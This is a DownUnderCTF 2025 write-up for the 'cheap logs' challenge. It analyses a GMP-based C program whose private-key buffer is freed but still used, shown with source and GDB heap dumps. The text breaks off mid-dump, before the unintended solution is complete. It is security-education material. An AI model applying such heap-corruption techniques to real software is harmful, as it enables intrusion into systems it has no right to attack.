---
title: "cheap logs - DownUnderCTF 2025"
category: "pwn"
subcategory: "heap"
type: "writeup"
tags: ["pwn", "heap", "gef", "cheap", "logs", "downunderctf", "downunderctf-2025", "2025", "ctf-writeup"]
summary: "Linux Exploitation Expert - HackTricks Training"
source:
  name: "CTFtime writeup #40377"
  url: "https://ctftime.org/writeup/40377"
original_source: "https://7rocky.github.io/en/ctf/other/downunderctf/cheap-logs/"
ctf:
  name: "DownUnderCTF 2025"
  year: 2025
  challenge: "cheap logs"
---

## Metadata

- **CTF:** DownUnderCTF 2025
- **Task:** cheap logs
- **Author team:** thehackerscrew
- **CTFtime:** <https://ctftime.org/writeup/40377>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/downunderctf/cheap-logs/>

---
![Linux Exploitation Expert](https://7rocky.github.io/images/LEE.png)

Linux Exploitation Expert — HackTricks Training

Progress from binary exploitation fundamentals to advanced exploit development in Linux across user space, heap, ARM, kernel, and browser targets.

[View Course](https://hacktricks-training.com/courses/lee/) ×

We are given the following source code in C (`chall.c`) along with its compiled version and some other files to deploy the challenge locally:

`

```
    $ ls
    Dockerfile  build.sh  chall  chall.c  ld-linux-x86-64.so.2  libc.so.6  libgmp.so.10  nsjail.cfg
```

`

`

```
    #include <ctype.h>
    #include <stdarg.h>
    #include <stdlib.h>
    #include <sys/random.h>
    /* clang-format off */
    #include <stdio.h>              /* stdio.h needs to come before gmp.h */
    #include <gmp.h>
    /* clang-format on */
    
    #define STATUS_SUCCESS 0
    #define STATUS_FAIL 1
    
    #define PRIVKEY_SIZE 2184
    #define HEXSTRING_SIZE 1024
    
    static char *hexstring = NULL;
    
    void print_flag() {
      char *flag;
      flag = getenv("FLAG");
      puts(flag ? flag : "DUCTF{test_flag}");
    }
    
    void submit_answer(mpz_t pub, mpz_t g, mpz_t p, mpz_t guess) {
      puts("Enter your guess (hex): ");
      mpz_inp_str(guess, stdin, 16);
    
      mpz_powm_sec(guess, g, guess, p);
      if (mpz_cmp(guess, pub) == 0) {
        print_flag();
      } else {
        puts("Incorrect!");
      }
    }
    
    void menu() {
      puts("1> Print public key");
      puts("2> Start over");
      puts("3> Submit answer");
      puts("4> Exit");
      puts("> ");
    }
    
    void print_public_key(mpz_t pub, mpz_t priv, mpz_t g, mpz_t p) {
      mpz_powm_sec(pub, g, priv, p);
    
      hexstring = mpz_get_str(hexstring, 16, pub);
      printf("Public Key: %s\n", hexstring);
    }
    
    int init(mpz_t pub, mpz_t priv, mpz_t g, mpz_t q, mpz_t p) {
      int ret;
      mp_limb_t *buf;
      size_t nb = PRIVKEY_SIZE;
    
      /* mod */
      mpz_set_str(
          p,
          "C2F2E0F7EC137C1F4F67D5B4276756FCDA5D5DAADDE9993AD2289D7CA855F50BCEC64FE5"
          "859C503A654F32422C5C02B5083BC83DB66EECBD347B971C0ACEF5A387C5E90FCFD25F87"
          "F565752574CC4D72E1AFE0E09A1FBFDE1F1960A56226523BD67B0E7FDE83FE53F85AC61D"
          "94AB52D837CCC1120F22D58CA79334E23B66AD23B1CB493F5DC8E2B7",
          16);
    
      /* order */
      mpz_sub_ui(q, p, 1);
      mpz_divexact_ui(q, q, 2);
    
      /* generator */
      mpz_set_str(g, "2", 10);
    
      /* private key */
      buf = (mp_limb_t *)malloc(nb);
      if (buf == NULL) {
        puts("init: err malloc");
        ret = STATUS_FAIL;
        goto err;
      }
    
      size_t nwritten = getrandom(buf, nb, 0);
      if (nwritten < nb) {
        puts("init: err getrandom");
        ret = STATUS_FAIL;
        goto err;
      }
    
      mpz_roinit_n(priv, buf, nb / sizeof(mp_limb_t));
    
      /* hexstring */
      if (hexstring == NULL && (hexstring = malloc(HEXSTRING_SIZE)) == NULL) {
        puts("init: err malloc");
        ret = STATUS_FAIL;
        goto err;
      };
      ret = STATUS_SUCCESS;
    
    err:
      free(buf);
      return ret;
    }
    
    int main() {
      int ret;
      char c;
      char *outbuffer = NULL;
    
      setvbuf(stdout, NULL, _IONBF, 0);
      setvbuf(stderr, NULL, _IONBF, 0);
      setvbuf(stdin, NULL, _IONBF, 0);
    
      mpz_t p, q, g, priv, pub, guess;
      mpz_inits(p, q, g, priv, pub, guess, NULL);
    
      if (init(pub, priv, g, q, p) == STATUS_FAIL) {
        ret = STATUS_FAIL;
        goto cleanup;
      }
      print_public_key(pub, priv, g, p);
    
      for (;;) {
        menu();
    
        do {
          c = getchar();
          if (c == EOF) {
            ret = STATUS_SUCCESS;
            goto cleanup;
          }
        } while (isspace(c));
    
        switch (c) {
        case '1':
          print_public_key(pub, priv, g, p);
          break;
        case '2':
          if (init(pub, priv, g, q, p) == STATUS_FAIL) {
            ret = STATUS_FAIL;
            goto cleanup;
          }
          break;
        case '3':
          submit_answer(pub, g, p, guess);
          break;
        case '4':
          ret = STATUS_SUCCESS;
          goto cleanup;
        default:
          puts("Invalid choice");
          break;
        }
      }
    
    cleanup:
      puts("Bye!");
      mpz_clears(p, q, g, priv, pub, guess, NULL);
      free(hexstring);
      return ret;
    }
```

`

## Source code analysis

This is supposed to be a crypto-pwn challenge, so that’s why we see the use of GMP library and a challenge written in C.

In `main`, we see how it initializes some big integers as `mpz_t` (multi-precission integers from GMP):

`

```
    int main() {
      int ret;
      char c;
      char *outbuffer = NULL;
    
      // ...
    
      mpz_t p, q, g, priv, pub, guess;
      mpz_inits(p, q, g, priv, pub, guess, NULL);
    
      if (init(pub, priv, g, q, p) == STATUS_FAIL) {
        // ...
      }
      print_public_key(pub, priv, g, p);
```

`

Basically, it initializes six `mpz_t` variables: , , , ,  and .

In `init`, it initializes those variables:

`

```
      /* mod */
      mpz_set_str(
          p,
          "C2F2E0F7EC137C1F4F67D5B4276756FCDA5D5DAADDE9993AD2289D7CA855F50BCEC64FE5"
          "859C503A654F32422C5C02B5083BC83DB66EECBD347B971C0ACEF5A387C5E90FCFD25F87"
          "F565752574CC4D72E1AFE0E09A1FBFDE1F1960A56226523BD67B0E7FDE83FE53F85AC61D"
          "94AB52D837CCC1120F22D58CA79334E23B66AD23B1CB493F5DC8E2B7",
          16);
    
      /* order */
      mpz_sub_ui(q, p, 1);
      mpz_divexact_ui(q, q, 2);
    
      /* generator */
      mpz_set_str(g, "2", 10);
```

`

As can be seen,  is generated from a hard-coded hexadecimal string, and it is a 1088-bit prime number:

`

```
    $ python3 -q
    >>> from Crypto.Util.number import isPrime
    >>> p = 0xC2F2E0F7EC137C1F4F67D5B4276756FCDA5D5DAADDE9993AD2289D7CA855F50BCEC64FE5859C503A654F32422C5C02B5083BC83DB66EECBD347B971C0ACEF5A387C5E90FCFD25F87F565752574CC4D72E1AFE0E09A1FBFDE1F1960A56226523BD67B0E7FDE83FE53F85AC61D94AB52D837CCC1120F22D58CA79334E23B66AD23B1CB493F5DC8E2B7
    >>> p.bit_length()
    1088
    >>> isPrime(p)
    1
```

`

Next,  (another prime number) and .

After that, it generates the private key from random bytes:

`

```
      int ret;
      mp_limb_t *buf;
      size_t nb = PRIVKEY_SIZE;
    
      // ...
    
      /* private key */
      buf = (mp_limb_t *)malloc(nb);
      if (buf == NULL) {
        puts("init: err malloc");
        ret = STATUS_FAIL;
        goto err;
      }
    
      size_t nwritten = getrandom(buf, nb, 0);
      if (nwritten < nb) {
        puts("init: err getrandom");
        ret = STATUS_FAIL;
        goto err;
      }
    
      mpz_roinit_n(priv, buf, nb / sizeof(mp_limb_t));
    
      /* hexstring */
      if (hexstring == NULL && (hexstring = malloc(HEXSTRING_SIZE)) == NULL) {
        puts("init: err malloc");
        ret = STATUS_FAIL;
        goto err;
      };
      ret = STATUS_SUCCESS;
    
    err:
      free(buf);
      return ret;
    }
```

`

For this purpose, it uses `malloc` to generate a 2184-byte buffer (`PRIVKEY_SIZE`) and assigns it to  using `mpz_roinit_n`. According to the [documentation](https://gmplib.org/manual/Integer-Special-Functions), this function adds a pointer to the `mpz_t` structure that points to the limbs of the multi-precission integer. In this context, a limb is a 64-bit integer, so that a multi-precission integer can be represented as a list of limbs.

The problem here is that the function calls `free` on the buffer that holds the limbs. As a result, the original  changes because the heap allocator writes some metadata on this memory region.

Indeed, after calling `init` for the first time, the program subsequently calls `print_public_key`:

`

```
    void print_public_key(mpz_t pub, mpz_t priv, mpz_t g, mpz_t p) {
      mpz_powm_sec(pub, g, priv, p);
    
      hexstring = mpz_get_str(hexstring, 16, pub);
      printf("Public Key: %s\n", hexstring);
    }
```

`

The public key is computed as .

The way this is implemented causes a problem, because the limbs for  will take part of the previously freed chunk. As a result, the limbs for  will overwrite part of the limbs of . We will see this better with GDB.

Last but not least, these are the options we can use:

`

```
      for (;;) {
        menu();
    
        do {
          c = getchar();
          if (c == EOF) {
            // ...
          }
        } while (isspace(c));
    
        switch (c) {
        case '1':
          print_public_key(pub, priv, g, p);
          break;
        case '2':
          if (init(pub, priv, g, q, p) == STATUS_FAIL) {
            // ...
          }
          break;
        case '3':
          submit_answer(pub, g, p, guess);
          break;
        case '4':
          // ...
        default:
          puts("Invalid choice");
          break;
        }
      }
    
      // ...
    }
```

`

Basically, print the public key , regenerate  and call `submit_answer`, where we are supposed to guess the private key :

`

```
    void submit_answer(mpz_t pub, mpz_t g, mpz_t p, mpz_t guess) {
      puts("Enter your guess (hex): ");
      mpz_inp_str(guess, stdin, 16);
    
      mpz_powm_sec(guess, g, guess, p);
      if (mpz_cmp(guess, pub) == 0) {
        print_flag();
      } else {
        puts("Incorrect!");
      }
    }
```

`

Probably, this is the crypto part of the challenge, because we need to find  so that , which implies to solve the Discrete Logarithm Problem. This is not feasible since the order of  in  is , which is a big prime number.

## Debugging with GDB

First of all, let’s compile the program to get source code support within GDB (`-g`):

`

```
    $ gcc -g chall.c -o test -lgmp
```

`

`

```
    $ gdb -q test
    Reading symbols from test...
    gef> break print_public_key
    Breakpoint 1 at 0x14ec: file chall.c, line 45.
    gef> run
    Starting program: ./test
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    
    Breakpoint 1, print_public_key (pub=0x7fffffffe750, priv=0x7fffffffe740, g=0x7fffffffe730, p=0x7fffffffe710) at chall.c:45
    45        mpz_powm_sec(pub, g, priv, p);
    
    ...
    
         40     puts("4> Exit");
         41     puts("> ");
         42   }
         43   
         44   void print_public_key(mpz_t pub, mpz_t priv, mpz_t g, mpz_t p) {
                         // pub = 0x00007fffffffe6e8  ->  0x00007fffffffe750  ->  0x0000000000000000
                         // priv = 0x00007fffffffe6e0  ->  0x00007fffffffe740  ->  0x0000011100000000
                         // g = 0x00007fffffffe6d8  ->  0x00007fffffffe730  ->  0x0000000100000002
                         // p = 0x00007fffffffe6d0  ->  0x00007fffffffe710  ->  0x0000001100000012
    *->  45     mpz_powm_sec(pub, g, priv, p);
         46
         47     hexstring = mpz_get_str(hexstring, 16, pub);
         48     printf("Public Key: %s\n", hexstring);
         49   }
         50
    
    ...
    
    gef> x/12gx 0x00007fffffffe710
    0x7fffffffe710: 0x0000001100000012      0x00005555555592a0
    0x7fffffffe720: 0x0000001100000011      0x0000555555559340
    0x7fffffffe730: 0x0000000100000002      0x00005555555593d0
    0x7fffffffe740: 0x0000011100000000      0x00005555555593f0
    0x7fffffffe750: 0x0000000000000000      0x00007ffff7f999b8
    0x7fffffffe760: 0x0000000000000000      0x00007ffff7f999b8
```

`

As can be seen, we have some stack variables for , , ,  that are already set. These are `mpz_t` structures, where  is the number of limbs for  and  (according to the [documentation](https://gmplib.org/manual/Integer-Internals)). This makes sense because  bits. On the other hand,  contains  limbs, which corresponds to  bytes (`PRIVKEY_SIZE`).

Let’s have a look at the heap:

`

```
    gef> visual-heap -n
    0x555555559000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 | ................ |
    0x555555559010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
    * 39 lines, 0x270 bytes
    0x555555559290|+0x00000|+0x00290: 0x0000000000000000 0x00000000000000a1 | ................ |
    0x5555555592a0|+0x00010|+0x002a0: 0xb1cb493f5dc8e2b7 0xa79334e23b66ad23 | ...]?I..#.f;.4.. |
    0x5555555592b0|+0x00020|+0x002b0: 0x37ccc1120f22d58c 0xf85ac61d94ab52d8 | .."....7.R....Z. |
    0x5555555592c0|+0x00030|+0x002c0: 0xd67b0e7fde83fe53 0x1f1960a56226523b | S.....{.;R&b.`.. |
    0x5555555592d0|+0x00040|+0x002d0: 0xe1afe0e09a1fbfde 0xf565752574cc4d72 | ........rM.t%ue. |
    0x5555555592e0|+0x00050|+0x002e0: 0x87c5e90fcfd25f87 0x347b971c0acef5a3 | ._............{4 |
    0x5555555592f0|+0x00060|+0x002f0: 0x083bc83db66eecbd 0x654f32422c5c02b5 | ..n.=.;...\,B2Oe |
    0x555555559300|+0x00070|+0x00300: 0xcec64fe5859c503a 0xd2289d7ca855f50b | :P...O....U.|.(. |
    0x555555559310|+0x00080|+0x00310: 0xda5d5daadde9993a 0x4f67d5b4276756fc | :....]]..Vg'..gO |
    0x555555559320|+0x00090|+0x00320: 0xc2f2e0f7ec137c1f 0x0000000000000000 | .|.............. |
    0x555555559330|+0x00000|+0x00330: 0x0000000000000000 0x0000000000000091 | ................ |
    0x555555559340|+0x00010|+0x00340: 0xd8e5a49faee4715b 0x53c99a711db35691 | [q.......V..q..S |
    0x555555559350|+0x00020|+0x00350: 0x1be6608907916ac6 0xfc2d630eca55a96c | .j...`..l.U..c-. |
    0x555555559360|+0x00030|+0x00360: 0xeb3d873fef41ff29 0x0f8cb052b113291d | ).A.?.=..)..R... |
    0x555555559370|+0x00040|+0x00370: 0x70d7f0704d0fdfef 0xfab2ba92ba6626b9 | ...Mp..p.&f..... |
    0x555555559380|+0x00050|+0x00380: 0xc3e2f487e7e92fc3 0x9a3dcb8e05677ad1 | ./.......zg...=. |
    0x555555559390|+0x00060|+0x00390: 0x841de41edb37765e 0x32a79921162e015a | ^v7.....Z...!..2 |
    0x5555555593a0|+0x00070|+0x003a0: 0xe76327f2c2ce281d 0x69144ebe542afa85 | .(...'c...*T.N.i |
    0x5555555593b0|+0x00080|+0x003b0: 0x6d2eaed56ef4cc9d 0xa7b3eada13b3ab7e | ...n...m~....... |
    0x5555555593c0|+0x00000|+0x003c0: 0x6179707bf609be0f 0x0000000000000021 | ....{pya!....... |
    0x5555555593d0|+0x00010|+0x003d0: 0x0000000000000002 0x0000000000000000 | ................ |
    0x5555555593e0|+0x00000|+0x003e0: 0x0000000000000000 0x0000000000000891 | ................ |  <-  unsortedbins[1/1]
    0x5555555593f0|+0x00010|+0x003f0: 0x00007ffff7e03b20 0x00007ffff7e03b20 |  ;...... ;...... |
    0x555555559400|+0x00020|+0x00400: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559410|+0x00030|+0x00410: 0xe31257e8e04b30bd 0x2740cc6385f5bb60 | .0K..W..`...c.@' |
    0x555555559420|+0x00040|+0x00420: 0x421e597a2ee65c84 0x46b41aa74df5a659 | .\..zY.BY..M...F |
    0x555555559430|+0x00050|+0x00430: 0x78cb9fe27e268c83 0x3ce7f74abdd8fe43 | ..&~...xC...J..< |
    0x555555559440|+0x00060|+0x00440: 0x4cdd7ed600498b52 0x0df81f8e0ed4e711 | R.I..~.L........ |
    0x555555559450|+0x00070|+0x00450: 0x233746b338e3f7b9 0xb765b677bea40897 | ...8.F7#....w.e. |
    0x555555559460|+0x00080|+0x00460: 0xe49b93fa372cd71b 0x3a6a8052331c838f | ..,7.......3R.j: |
    0x555555559470|+0x00090|+0x00470: 0x08e27dfa6a2d2af5 0xed4235b34cb8117a | .*-j.}..z..L.5B. |
    0x555555559480|+0x000a0|+0x00480: 0xca4c596c1aec935c 0xbb25749bb43a96f1 | \...lYL...:..t%. |
    0x555555559490|+0x000b0|+0x00490: 0xfcb968be66050cda 0x74f5bab70a0b7195 | ...f.h...q.....t |
    0x5555555594a0|+0x000c0|+0x004a0: 0x6dd4d7cbb5dccd48 0x98b3e5a0bad792e7 | H......m........ |
    ...
    0x555555559c60|+0x00880|+0x00c60: 0x5cf57e30d5d121a5 0x4ccd54228ab46508 | .!..0~.\.e.."T.L |
    0x555555559c70|+0x00000|+0x00c70: 0x0000000000000890 0x0000000000000410 | ................ |
    0x555555559c80|+0x00010|+0x00c80: 0x0000000000000000 0x0000000000000000 | ................ |
    * 63 lines, 0x3f0 bytes
    0x55555555a080|+0x00000|+0x01080: 0x0000000000000000 0x000000000001ff81 | ................ |  <-  top
    0x55555555a090|+0x00010|+0x01090: 0x0000000000000000 0x0000000000000000 | ................ |
```

`

Notice that the large buffer that holds the limbs of  is freed in the Unsorted Bin:

`

```
    gef> heap bins unsorted
    ---------------------------------------------------------------------------------------- Unsorted Bin for arena 'main_arena' ----------------------------------------------------------------------------------------
    unsorted_bin[idx=0, size=any, @0x7ffff7e03b30]: fd=0x5555555593e0, bk=0x7ffff7e03b20
     -> Chunk(base=0x5555555593e0, addr=0x5555555593f0, size=0x890, flags=PREV_INUSE, fd=0x7ffff7e03b20 <main_arena+0x60>, bk=0x7ffff7e03b20 <main_arena+0x60>)
    [+] Found 1 valid chunks in unsorted bin (when traced from `bk`)
```

`

Notice that after calling `print_public_key` for the first time, the heap changes a little bit:

`

```
    gef> visual-heap -n
    0x555555559000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 | ................ |
    0x555555559010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
    * 39 lines, 0x270 bytes
    0x555555559290|+0x00000|+0x00290: 0x0000000000000000 0x00000000000000a1 | ................ |
    0x5555555592a0|+0x00010|+0x002a0: 0xb1cb493f5dc8e2b7 0xa79334e23b66ad23 | ...]?I..#.f;.4.. |
    0x5555555592b0|+0x00020|+0x002b0: 0x37ccc1120f22d58c 0xf85ac61d94ab52d8 | .."....7.R....Z. |
    0x5555555592c0|+0x00030|+0x002c0: 0xd67b0e7fde83fe53 0x1f1960a56226523b | S.....{.;R&b.`.. |
    0x5555555592d0|+0x00040|+0x002d0: 0xe1afe0e09a1fbfde 0xf565752574cc4d72 | ........rM.t%ue. |
    0x5555555592e0|+0x00050|+0x002e0: 0x87c5e90fcfd25f87 0x347b971c0acef5a3 | ._............{4 |
    0x5555555592f0|+0x00060|+0x002f0: 0x083bc83db66eecbd 0x654f32422c5c02b5 | ..n.=.;...\,B2Oe |
    0x555555559300|+0x00070|+0x00300: 0xcec64fe5859c503a 0xd2289d7ca855f50b | :P...O....U.|.(. |
    0x555555559310|+0x00080|+0x00310: 0xda5d5daadde9993a 0x4f67d5b4276756fc | :....]]..Vg'..gO |
    0x555555559320|+0x00090|+0x00320: 0xc2f2e0f7ec137c1f 0x0000000000000000 | .|.............. |
    0x555555559330|+0x00000|+0x00330: 0x0000000000000000 0x0000000000000091 | ................ |
    0x555555559340|+0x00010|+0x00340: 0xd8e5a49faee4715b 0x53c99a711db35691 | [q.......V..q..S |
    0x555555559350|+0x00020|+0x00350: 0x1be6608907916ac6 0xfc2d630eca55a96c | .j...`..l.U..c-. |
    0x555555559360|+0x00030|+0x00360: 0xeb3d873fef41ff29 0x0f8cb052b113291d | ).A.?.=..)..R... |
    0x555555559370|+0x00040|+0x00370: 0x70d7f0704d0fdfef 0xfab2ba92ba6626b9 | ...Mp..p.&f..... |
    0x555555559380|+0x00050|+0x00380: 0xc3e2f487e7e92fc3 0x9a3dcb8e05677ad1 | ./.......zg...=. |
    0x555555559390|+0x00060|+0x00390: 0x841de41edb37765e 0x32a79921162e015a | ^v7.....Z...!..2 |
    0x5555555593a0|+0x00070|+0x003a0: 0xe76327f2c2ce281d 0x69144ebe542afa85 | .(...'c...*T.N.i |
    0x5555555593b0|+0x00080|+0x003b0: 0x6d2eaed56ef4cc9d 0xa7b3eada13b3ab7e | ...n...m~....... |
    0x5555555593c0|+0x00000|+0x003c0: 0x6179707bf609be0f 0x0000000000000021 | ....{pya!....... |
    0x5555555593d0|+0x00010|+0x003d0: 0x0000000000000002 0x0000000000000000 | ................ |
    0x5555555593e0|+0x00000|+0x003e0: 0x0000000000000000 0x0000000000000091 | ................ |
    0x5555555593f0|+0x00010|+0x003f0: 0x6122f614de14a2d0 0x7a0c654c622678a8 | ......"a.x&bLe.z |
    0x555555559400|+0x00020|+0x00400: 0x2e3dbd89eae96719 0xd2ba83c046a43713 | .g....=..7.F.... |
    0x555555559410|+0x00030|+0x00410: 0x9133e7d8b1495429 0x684a556a0af350aa | )TI...3..P..jUJh |
    0x555555559420|+0x00040|+0x00420: 0x1e163d12a9d2b132 0x6ce81fc92ebad5ae | 2....=.........l |
    0x555555559430|+0x00050|+0x00430: 0x8d2da21ce50337fc 0xa478a29a81efd6bb | .7....-.......x. |
    0x555555559440|+0x00060|+0x00440: 0xec099f84e9f1c4fe 0xe4c6149eb82e4b45 | ........EK...... |
    0x555555559450|+0x00070|+0x00450: 0x5d2d0afce8836382 0x99b2df9d5bccf57c | .c....-]|..[.... |
    0x555555559460|+0x00080|+0x00460: 0xa16f635ed5550ccf 0x2fb9c29f9c9f4547 | ..U.^co.GE...../ |
    0x555555559470|+0x00000|+0x00470: 0x3e9bcade916f1dfb 0x0000000000000801 | ..o....>........ |  <-  unsortedbins[1/1]
    0x555555559480|+0x00010|+0x00480: 0x00007ffff7e03b20 0x00007ffff7e03b20 |  ;...... ;...... |
    0x555555559490|+0x00020|+0x00490: 0x0000000000000000 0x0000000000000000 | ................ |
    0x5555555594a0|+0x00030|+0x004a0: 0x6dd4d7cbb5dccd48 0x98b3e5a0bad792e7 | H......m........ |
    ...
    0x555555559c60|+0x007f0|+0x00c60: 0x5cf57e30d5d121a5 0x4ccd54228ab46508 | .!..0~.\.e.."T.L |
    0x555555559c70|+0x00000|+0x00c70: 0x0000000000000800 0x0000000000000410 | ................ |
    0x555555559c80|+0x00010|+0x00c80: 0x6564616362396533 0x6266643166363139 | 3e9bcade916f1dfb |
    0x555555559c90|+0x00020|+0x00c90: 0x6639326339626632 0x3734353466396339 | 2fb9c29f9c9f4547 |
    0x555555559ca0|+0x00030|+0x00ca0: 0x6535333666363161 0x6663633035353564 | a16f635ed5550ccf |
    0x555555559cb0|+0x00040|+0x00cb0: 0x6439666432623939 0x6337356663636235 | 99b2df9d5bccf57c |
    0x555555559cc0|+0x00050|+0x00cc0: 0x6366613064326435 0x3238333633383865 | 5d2d0afce8836382 |
    0x555555559cd0|+0x00060|+0x00cd0: 0x6539343136633465 0x3534623465323862 | e4c6149eb82e4b45 |
    0x555555559ce0|+0x00070|+0x00ce0: 0x3438663939306365 0x6566346331663965 | ec099f84e9f1c4fe |
    0x555555559cf0|+0x00080|+0x00cf0: 0x6139326138373461 0x6262366466653138 | a478a29a81efd6bb |
    0x555555559d00|+0x00090|+0x00d00: 0x6331326164326438 0x6366373333303565 | 8d2da21ce50337fc |
    0x555555559d10|+0x000a0|+0x00d10: 0x3963663138656336 0x6561356461626532 | 6ce81fc92ebad5ae |
    0x555555559d20|+0x000b0|+0x00d20: 0x3231643336316531 0x3233316232643961 | 1e163d12a9d2b132 |
    0x555555559d30|+0x000c0|+0x00d30: 0x6136353561343836 0x6161303533666130 | 684a556a0af350aa |
    0x555555559d40|+0x000d0|+0x00d40: 0x3864376533333139 0x3932343539343162 | 9133e7d8b1495429 |
    0x555555559d50|+0x000e0|+0x00d50: 0x3063333861623264 0x3331373334613634 | d2ba83c046a43713 |
    0x555555559d60|+0x000f0|+0x00d60: 0x3938646264336532 0x3931373639656165 | 2e3dbd89eae96719 |
    0x555555559d70|+0x00100|+0x00d70: 0x6334353663306137 0x3861383736323236 | 7a0c654c622678a8 |
    0x555555559d80|+0x00110|+0x00d80: 0x3431366632323136 0x3064326134316564 | 6122f614de14a2d0 |
    0x555555559d90|+0x00120|+0x00d90: 0x0000000000000000 0x0000000000000000 | ................ |
    * 46 lines, 0x2e0 bytes
    0x55555555a080|+0x00000|+0x01080: 0x0000000000000000 0x000000000001ff81 | ................ |  <-  top
    0x55555555a090|+0x00010|+0x01090: 0x0000000000000000 0x0000000000000000 | ................ |
    * 8182 lines, 0x1ff60 bytes
```

`

The difference is that the chunk where  was originally placed, is now divided to hold  too. In fact, we can see the pointers of the `mpz_t` structures on the stack:

`

```
    gef> x/12gx 0x00007fffffffe710
    0x7fffffffe710: 0x0000001100000012      0x00005555555592a0
    0x7fffffffe720: 0x0000001100000011      0x0000555555559340
    0x7fffffffe730: 0x0000000100000002      0x00005555555593d0
    0x7fffffffe740: 0x0000011100000000      0x00005555555593f0
    0x7fffffffe750: 0x0000001100000011      0x00005555555593f0
    0x7fffffffe760: 0x0000000000000000      0x00007ffff7f999b8
```

`

As can be seen, the limbs for  are at `0x5555555593f0`, and it coincides with the address of the limbs of  (although the former holds  limbs whereas the latter holds only ).

This the reason why the public key is always different every time we call `print_public_key`, because the private key gets modified on each time:

`

```
    $ ./chall
    Public Key: 9dfa479ba627861d68b5ec06745ae43323cb3fb547c255e660f097d2b8b7cb4c6cdd3e58c07620bbd82a56eef5f6de012e3aff1d988483a549a7a51a2874d5100dd185abf5d0f659c036ffbd0b61f539ca166506792216f89aaba9fcff7f2af9b773397a3e30df7aae995f98c43e05f62550ed323b30b0d8f2a45b72e2f9988948fff5195037b699
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    1
    Public Key: 3bbfdf709bbef6a8fb140ab4a8d305df908e0f704fbd25a1b7c2dcb861f52f99ced6bdde277ff55b58ecbf0a8a54697ad9d181720017579f7dbd65883356d5ccb56e6a77cce16344f0f3bfdad60e54dde378589384f5def4b18c07488b9a31dad6f5045396e2552ddde1e188bb8a56222696b48cfdc8eae2b2301cb2bcd92c2e5d8bd07c81b33122
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    1
    Public Key: 7d7e04a7afb4991c9e659aafec2e5044d2585817c3423afce7194c491bf7e36c4f2d987b7d165435569d440f60aab6a7f090ca88ee7b000e6ffd223b29f1521684fb6165f5bca0ac242fb8ce5e24ab41f30978a95c5aa5d15b2b822d38dad9cbed01f65bd3e0f9b37d3bf816fc5adcd51164b729e696a4f3e6bb182d9abb37127d85017767a4cb22
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    1
    Public Key: 5654901aad597b5ab5f91f9b80a27cf13d90393c15a2a083a43200302761f89fcbb22d862eb469ce0b8f000f6f64ac83ccdcab458e343ca4f1558ea7a900844e1aae0e12a75e7604e16eeeb689f72317dd4abd1e5a7d0d3da1ea972f41b3084b994014df63ebea6e974d294444fc241036cd777a3384dfcfa40c408949aa2a7361f6081869a43afb
```

`

## Solution

The intended solution is a bit more convoluted. For those interested, you might want to look at the [DownUnderCTF official GitHub repository](https://github.com/DownUnderCTF/Challenges_2025_Public/tree/main/crypto/cheap_logs/solve). In this writeup I will show an unintended solution that is slightly easier to understand.

Remember that `init` generates a random private key and frees the buffer. As a result, after calling this function, the next allocation will be placed here as long as it is smaller in size.

Therefore, we can use option 2 to regenerate the private key, so that the limbs of  are located in another heap chunk (because it does not fit in the freed slot due to the size of ):

`

```
    gef> run
    Starting program: ./test
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    Public Key: 6741fc53d593d90e2f33043cb10185e341d47a5015f6f528b2cb9aac340c861f252ac493f59b9cc20584015f5520a92f49c5460be4e617ade1cb24ffe8b33709f3b2c859a57ab6809d47fe4362a753667c55a28c488efa27cc3c3d5c9d672b1c3a34a41043
    5c83ad697617b9e124943df99424aa7cce41e136bd3ef0141fa743aed5803050029f73
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    2
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    ^C
    Program received signal SIGINT, Interrupt.
    0x00007ffff7d1ba61 in __GI___libc_read (fd=0x0, buf=0x7ffff7e03963 <_IO_2_1_stdin_+131>, nbytes=0x1) at ../sysdeps/unix/sysv/linux/read.c:26
    warning: 26     ../sysdeps/unix/sysv/linux/read.c: No such file or directory
```

`

`

```
    gef> x/12gx 0x00007fffffffe710
    0x7fffffffe710: 0x0000001100000012      0x00005555555592a0
    0x7fffffffe720: 0x0000001100000011      0x0000555555559340
    0x7fffffffe730: 0x0000000100000002      0x00005555555593d0
    0x7fffffffe740: 0x0000011100000000      0x000055555555a090
    0x7fffffffe750: 0x0000001100000011      0x00005555555593f0
    0x7fffffffe760: 0x0000000000000000      0x00007ffff7f8d910
    gef> visual-heap -n
    0x555555559000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 | ................ |
    0x555555559010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
    * 39 lines, 0x270 bytes
    0x555555559290|+0x00000|+0x00290: 0x0000000000000000 0x00000000000000a1 | ................ |
    0x5555555592a0|+0x00010|+0x002a0: 0xb1cb493f5dc8e2b7 0xa79334e23b66ad23 | ...]?I..#.f;.4.. |
    0x5555555592b0|+0x00020|+0x002b0: 0x37ccc1120f22d58c 0xf85ac61d94ab52d8 | .."....7.R....Z. |
    0x5555555592c0|+0x00030|+0x002c0: 0xd67b0e7fde83fe53 0x1f1960a56226523b | S.....{.;R&b.`.. |
    0x5555555592d0|+0x00040|+0x002d0: 0xe1afe0e09a1fbfde 0xf565752574cc4d72 | ........rM.t%ue. |
    0x5555555592e0|+0x00050|+0x002e0: 0x87c5e90fcfd25f87 0x347b971c0acef5a3 | ._............{4 |
    0x5555555592f0|+0x00060|+0x002f0: 0x083bc83db66eecbd 0x654f32422c5c02b5 | ..n.=.;...\,B2Oe |
    0x555555559300|+0x00070|+0x00300: 0xcec64fe5859c503a 0xd2289d7ca855f50b | :P...O....U.|.(. |
    0x555555559310|+0x00080|+0x00310: 0xda5d5daadde9993a 0x4f67d5b4276756fc | :....]]..Vg'..gO |
